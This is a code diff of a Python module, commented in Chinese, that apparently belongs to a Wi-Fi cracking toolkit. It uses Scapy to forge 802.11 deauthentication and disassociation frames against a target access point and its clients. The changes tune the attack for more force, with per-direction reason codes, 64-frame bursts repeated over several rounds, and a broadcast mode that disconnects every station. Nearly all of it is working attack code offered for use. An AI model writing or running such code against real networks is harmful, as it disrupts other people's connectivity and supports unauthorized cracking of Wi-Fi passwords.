@@ -1,16 +1,21 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""Scapy 层 2 deauth / disassoc 注入（辅助 aireplay）。
+"""Scapy 层 2 deauth / disassoc 注入。
 
-部分 USB 网卡上 aireplay-ng -0 发送次数少、速率低，体感「力度不够」。
-Scapy 直接构造 802.11 管理帧，可：
-  - 双向 deauth（AP↔STA）
-  - 双向 disassoc（部分客户端更敏感）
-  - 广播 + 单播
-  - 更高突发计数、更短帧间隔
+发包策略严格对齐参考脚本（MT7921U + Parallels ARM64 实测）:
+  /Volumes/256G/Wi-Fi破解/wifi-crack-kali/自动攻击/auto_attack.py
 
-依赖可选：python3-scapy（Kali: apt install python3-scapy）。
-无 scapy 时静默不可用，不影响主流程。
+要点（只抄发送侧，不抄抓包逻辑）:
+  1) 帧结构 RadioTap/Dot11/Deauth|Disas
+  2) reason 分向:
+       deauth AP→STA = 7
+       deauth STA→AP = 1
+       disas  双向   = 8
+  3) 组 burst 列表后一次 sendp(burst, inter=0.003)
+  4) 精准: 4 向 × 16 = 64 帧/轮；广播: 2 向 × 32 = 64 帧/轮
+  5) 默认连打 rounds 轮（参考脚本爆发阶段 ×4 → 256 帧）
+
+依赖可选: python3-scapy。无 scapy 时返回 0，由 aireplay 兜底。
 """
 
 from __future__ import annotations
@@ -35,8 +40,9 @@ class ScapyDeauth(object):
         cls._checked = True
         try:
             from scapy.all import (  # type: ignore
-                RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp,
+                RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp, conf,
             )
+            conf.verb = 0
             cls._scapy = {
                 'RadioTap': RadioTap,
                 'Dot11': Dot11,
@@ -51,7 +57,6 @@ class ScapyDeauth(object):
 
     @classmethod
     def fails_dependency_check(cls) -> bool:
-        # 可选依赖，不阻断启动
         return False
 
     @staticmethod
@@ -62,6 +67,54 @@ class ScapyDeauth(object):
         return m if is_mac_address(m) else None
 
     @classmethod
+    def build_burst(cls, bssid: str, client: Optional[str], copies: int):
+        """按 auto_attack.py 构造一帧 burst 列表。"""
+        S = cls._scapy
+        RadioTap = S['RadioTap']
+        Dot11 = S['Dot11']
+        Dot11Deauth = S['Dot11Deauth']
+        Dot11Disas = S['Dot11Disas']
+
+        bc = 'ff:ff:ff:ff:ff:ff'
+        target = client or bc
+        n = max(1, int(copies))
+
+        # Deauth: AP → 客户端  reason=7
+        deauth_ap = (RadioTap() / Dot11(
+            type=0, subtype=12,
+            addr1=target, addr2=bssid, addr3=bssid
+        ) / Dot11Deauth(reason=7))
+
+        # Deauth: 客户端 → AP  reason=1
+        deauth_cl = (RadioTap() / Dot11(
+            type=0, subtype=12,
+            addr1=bssid, addr2=target, addr3=bssid
+        ) / Dot11Deauth(reason=1))
+
+        # Disassoc: AP → 客户端  reason=8
+        disas_ap = (RadioTap() / Dot11(
+            type=0, subtype=10,
+            addr1=target, addr2=bssid, addr3=bssid
+        ) / Dot11Disas(reason=8))
+
+        # Disassoc: 客户端 → AP  reason=8
+        disas_cl = (RadioTap() / Dot11(
+            type=0, subtype=10,
+            addr1=bssid, addr2=target, addr3=bssid
+        ) / Dot11Disas(reason=8))
+
+        if client:
+            # 精准: 4 向 × n（参考 16 → 64 帧/轮）
+            return (
+                [deauth_ap] * n
+                + [deauth_cl] * n
+                + [disas_ap] * n
+                + [disas_cl] * n
+            )
+        # 广播: 只打 AP→广播 的 deauth/disas（参考 32+32）
+        return [deauth_ap] * n + [disas_ap] * n
+
+    @classmethod
     def deauth(
         cls,
         target_bssid: str,
@@ -69,15 +122,20 @@ class ScapyDeauth(object):
         count: Optional[int] = None,
         iface: Optional[str] = None,
         inter: Optional[float] = None,
+        rounds: Optional[int] = None,
     ) -> int:
-        """注入 deauth+disassoc。返回尝试发送的帧数（失败 0）。"""
+        """注入 deauth+disassoc。返回成功送出的帧数估计（失败 0）。
+
+        count: 每向复制次数（精准默认 16，广播默认 32）
+        rounds: 连发轮数（默认 4，对齐参考「爆发 ×4」）
+        inter: sendp 帧间隔秒（默认 0.003）
+        """
         if not cls.available():
             return 0
 
         bssid = cls._norm_mac(target_bssid)
         if not bssid:
             return 0
-        # 显式传了 client 但非法 → 拒绝（避免静默变成广播）
         if client_mac is not None and str(client_mac).strip():
             client = cls._norm_mac(client_mac)
             if not client:
@@ -89,69 +147,46 @@ class ScapyDeauth(object):
         if not iface or not is_safe_iface(iface):
             return 0
 
-        try:
-            burst = int(count if count is not None
-                        else getattr(Configuration, 'scapy_deauth_count', 32) or 32)
-        except (TypeError, ValueError):
-            burst = 32
-        burst = max(4, min(burst, 256))
+        # 每向份数：有 count 用 count；否则精准 16 / 广播 32
+        if count is not None:
+            try:
+                per_dir = max(1, min(64, int(count)))
+            except (TypeError, ValueError):
+                per_dir = 16 if client else 32
+        else:
+            try:
+                cfg = int(getattr(Configuration, 'scapy_deauth_count', 0) or 0)
+            except (TypeError, ValueError):
+                cfg = 0
+            if cfg > 0:
+                per_dir = max(1, min(64, cfg))
+            else:
+                per_dir = 16 if client else 32
 
         try:
             gap = float(inter if inter is not None
-                        else getattr(Configuration, 'scapy_deauth_inter', 0.002) or 0.002)
+                        else getattr(Configuration, 'scapy_deauth_inter', 0.003) or 0.003)
         except (TypeError, ValueError):
-            gap = 0.002
+            gap = 0.003
         gap = max(0.0, min(gap, 0.05))
 
-        S = cls._scapy
-        RadioTap = S['RadioTap']
-        Dot11 = S['Dot11']
-        Dot11Deauth = S['Dot11Deauth']
-        Dot11Disas = S['Dot11Disas']
-        sendp = S['sendp']
+        try:
+            n_rounds = int(rounds if rounds is not None
+                           else getattr(Configuration, 'scapy_deauth_rounds', 4) or 4)
+        except (TypeError, ValueError):
+            n_rounds = 4
+        n_rounds = max(1, min(n_rounds, 8))
 
-        # reason=7 Class 3 frame received from nonassociated STA（常用触发重关联）
-        reason = int(getattr(Configuration, 'scapy_deauth_reason', 7) or 7)
-        bc = 'ff:ff:ff:ff:ff:ff'
-        frames = []
-
-        def _deauth(da: str, sa: str, bssid_addr: str):
-            return (RadioTap()
-                    / Dot11(type=0, subtype=12, addr1=da, addr2=sa, addr3=bssid_addr)
-                    / Dot11Deauth(reason=reason))
-
-        def _disas(da: str, sa: str, bssid_addr: str):
-            return (RadioTap()
-                    / Dot11(type=0, subtype=10, addr1=da, addr2=sa, addr3=bssid_addr)
-                    / Dot11Disas(reason=reason))
-
-        if client:
-            # 双向：AP→STA 与 STA→AP（不少驱动只吃一侧）
-            frames.extend([
-                _deauth(client, bssid, bssid),
-                _deauth(bssid, client, bssid),
-                _disas(client, bssid, bssid),
-                _disas(bssid, client, bssid),
-            ])
-        else:
-            # 广播 deauth/disassoc（踢所有关联站）
-            frames.extend([
-                _deauth(bc, bssid, bssid),
-                _disas(bc, bssid, bssid),
-            ])
+        burst = cls.build_burst(bssid, client, per_dir)
+        burst_size = len(burst)
+        sendp = cls._scapy['sendp']
 
         sent = 0
         try:
-            for pkt in frames:
-                sendp(
-                    pkt,
-                    iface=iface,
-                    count=burst,
-                    inter=gap,
-                    verbose=0,
-                )
-                sent += burst
+            for _ in range(n_rounds):
+                # 与参考脚本一致: sendp(burst, iface=..., inter=0.003)
+                sendp(burst, iface=iface, inter=gap, verbose=0)
+                sent += burst_size
         except Exception:
-            # 注入失败（驱动/权限/接口）→ 0，外层回退 aireplay
-            return 0
+            return sent if sent else 0
         return sent
